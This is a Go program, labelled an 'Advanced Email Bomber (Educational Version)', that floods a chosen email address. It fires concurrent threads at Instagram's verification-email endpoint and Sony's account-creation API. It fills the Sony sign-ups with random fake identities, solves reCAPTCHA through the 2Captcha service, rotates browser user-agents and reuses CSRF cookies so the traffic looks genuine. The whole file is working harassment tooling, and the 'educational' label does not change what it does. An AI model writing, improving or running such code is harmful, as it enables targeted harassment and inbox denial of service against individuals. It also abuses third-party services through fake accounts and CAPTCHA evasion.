package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"net/url" // <-- FIXED: Added the missing import
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

// userAgents is a list of browser user-agents to be chosen from randomly for each request.
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
}

// AttackVector defines the structure for a single attack type, compatible with both JSON and Form payloads.
type AttackVector struct {
	Name            string
	TargetURL       string
	RequiresCaptcha bool
	BuildPayload    func(targetEmail, captchaToken string) (io.Reader, string, error)
}

// --- Helper Functions for Random Data ---
func randString(n int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyz")
	s := make([]rune, n)
	for i := range s {
		s[i] = letters[rand.Intn(len(letters))]
	}
	return string(s)
}

func randDOB() string {
	year := rand.Intn(2003-1985) + 1985
	month := rand.Intn(12) + 1
	day := rand.Intn(28) + 1
	return fmt.Sprintf("%04d-%02d-%02d", year, month, day)
}

// ============== 2Captcha Solving Section ==============
const (
	sonySitekey = "6LdWbTcaAAAAADFe7Vs6-1jfzSnprQwDWJ51aRep"
	sonyPageurl = "https://acm.account.sony.com/create_account/personal"
)

func getCaptchaID(client *http.Client, captchaAPIKey string) (string, error) {
	data := url.Values{
		"key":       {captchaAPIKey},
		"method":    {"userrecaptcha"},
		"googlekey": {sonySitekey},
		"pageurl":   {sonyPageurl},
		"json":      {"1"},
	}
	resp, err := client.PostForm("https://2captcha.com/in.php", data)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	body, _ := io.ReadAll(resp.Body)
	if err := json.Unmarshal(body, &result); err != nil {
		return "", fmt.Errorf("error parsing 2captcha response: %w", err)
	}

	if status, ok := result["status"].(float64); !ok || status != 1 {
		return "", fmt.Errorf("2captcha service returned an error: %v", result["request"])
	}
	return result["request"].(string), nil
}

func pollForCaptchaToken(client *http.Client, captchaAPIKey, captchaID string) (string, error) {
	for i := 0; i < 24; i++ {
		time.Sleep(5 * time.Second)
		reqURL := fmt.Sprintf("https://2captcha.com/res.php?key=%s&action=get&id=%s&json=1", captchaAPIKey, captchaID)
		res, err := client.Get(reqURL)
		if err != nil {
			log.Printf("[WARNING] Network error while polling for captcha: %v. Retrying...", err)
			continue
		}

		var poll map[string]interface{}
		body, err := io.ReadAll(res.Body)
		res.Body.Close()
		if err != nil {
			return "", fmt.Errorf("error reading captcha status response: %w", err)
		}

		if err := json.Unmarshal(body, &poll); err != nil {
			return "", fmt.Errorf("error parsing captcha status JSON: %w", err)
		}

		if status, ok := poll["status"].(float64); ok && status == 1 {
			return poll["request"].(string), nil
		}
	}
	return "", fmt.Errorf("captcha was not solved in the specified time")
}

// --- Payload Builder Functions for each site ---
func buildSonyPayload(email, captchaToken string) (io.Reader, string, error) {
	password := randString(12) + "aA1!"
	payload := map[string]interface{}{
		"email":              email,
		"password":           password,
		"legalCountry":       "US",
		"language":           "en-US",
		"dateOfBirth":        randDOB(),
		"firstName":          randString(7),
		"lastName":           randString(7),
		"captchaProvider":    "google:recaptcha-invisible",
		"captchaSiteKey":     sonySitekey,
		"captchaResponse":    captchaToken,
		"clientID":           "37351a12-3e6a-4544-87ff-1eaea0846de2",
		"hashedTosPPVersion": "d3-7b2e7bfa9efbdd9371db8029cb263705",
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return nil, "", err
	}
	return bytes.NewBuffer(jsonData), "application/json", nil
}

func buildInstagramPayload(email, captchaToken string) (io.Reader, string, error) {
	data := url.Values{
		"email":     {email},
		"device_id": {""},
	}
	return strings.NewReader(data.Encode()), "application/x-www-form-urlencoded", nil
}

// --- Core Attack Function ---
func runAttack(wg *sync.WaitGroup, client *http.Client, vector AttackVector, targetEmail string, captchaKey string) {
	defer wg.Done()
	log.Printf("[STARTING] Sending request to: %s", vector.Name)
	captchaToken := ""
	var err error

	if vector.RequiresCaptcha {
		if captchaKey == "" {
			log.Printf("[ERROR] %s requires a 2Captcha API key, but none was provided.", vector.Name)
			return
		}
		captchaID, err := getCaptchaID(client, captchaKey)
		if err != nil {
			log.Printf("[ERROR] Could not get CAPTCHA ID for %s: %v", vector.Name, err)
			return
		}
		captchaToken, err = pollForCaptchaToken(client, captchaKey, captchaID)
		if err != nil {
			log.Printf("[ERROR] Could not get CAPTCHA token for %s: %v", vector.Name, err)
			return
		}
	}
	
	payloadReader, contentType, err := vector.BuildPayload(targetEmail, captchaToken)
	if err != nil {
		log.Printf("[ERROR] Could not build payload for %s: %v", vector.Name, err)
		return
	}

	req, err := http.NewRequest("POST", vector.TargetURL, payloadReader)
	if err != nil {
		log.Printf("[ERROR] Could not create request for %s: %v", vector.Name, err)
		return
	}
	
	randomUA := userAgents[rand.Intn(len(userAgents))]
	req.Header.Set("User-Agent", randomUA)
	req.Header.Set("Content-Type", contentType)

	if strings.Contains(vector.TargetURL, "instagram.com") {
		var csrfToken string
		instagramURL, _ := url.Parse("https://www.instagram.com")
		for _, cookie := range client.Jar.Cookies(instagramURL) {
			if cookie.Name == "csrftoken" {
				csrfToken = cookie.Value
				break
			}
		}
		if csrfToken != "" {
			req.Header.Set("X-Csrftoken", csrfToken)
			req.Header.Set("X-Ig-App-Id", "936619743392459")
		}
	}

	resp, err := client.Do(req)
	if err != nil {
		log.Printf("[FAILURE] Request to %s failed: %v", vector.Name, err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		log.Printf("[SUCCESS] Request to %s sent successfully. Status: %d", vector.Name, resp.StatusCode)
	} else {
		log.Printf("[FAILURE] Request to %s failed with status. Status: %d", vector.Name, resp.StatusCode)
	}
}

func promptForInput(reader *bufio.Reader, prompt string) string {
	fmt.Print(prompt)
	input, _ := reader.ReadString('\n')
	return strings.TrimSpace(input)
}

func main() {
	rand.Seed(time.Now().UnixNano())
	log.Println("--- Advanced Email Bomber (Educational Version) ---")

	reader := bufio.NewReader(os.Stdin)
	
	// <-- FIXED: Passing 'reader' to each function call
	targetEmail := promptForInput(reader, "Enter the target email address: ")
	if targetEmail == "" {
		log.Fatal("Error: Target email cannot be empty.")
	}

	captchaKey := promptForInput(reader, "Enter your 2captcha.com API key (optional, press Enter to skip): ")

	threadsStr := promptForInput(reader, "Enter the number of concurrent attacks (threads): ")
	threads, err := strconv.Atoi(threadsStr)
	if err != nil || threads <= 0 {
		log.Fatal("Error: Invalid number of threads. Please enter a positive number.")
	}

	attackVectors := []AttackVector{
		{
			Name:            "Instagram - Send Verify Email",
			TargetURL:       "https://www.instagram.com/api/v1/accounts/send_verify_email/",
			RequiresCaptcha: false,
			BuildPayload:    buildInstagramPayload,
		},
		{
			Name:            "Sony - Create Account",
			TargetURL:       "https://acm.account.sony.com/api/accountInterimRegister",
			RequiresCaptcha: true,
			BuildPayload:    buildSonyPayload,
		},
	}

	log.Printf("Target Email: %s | Concurrent Threads: %d", targetEmail, threads)
	log.Println("Starting attack...")

	var wg sync.WaitGroup
	jar, _ := cookiejar.New(nil)
	client := &http.Client{Jar: jar, Timeout: 60 * time.Second}
	
	log.Println("Initializing sessions with target sites...")
	client.Get("https://www.instagram.com/")
	client.Get("https://acm.account.sony.com/create_account/personal")
	log.Println("Sessions initialized.")

	for i := 0; i < threads; i++ {
		vector := attackVectors[rand.Intn(len(attackVectors))]
		wg.Add(1)
		go runAttack(&wg, client, vector, targetEmail, captchaKey)
		time.Sleep(100 * time.Millisecond)
	}

	wg.Wait()
	log.Println("--- Operation Finished ---")
}
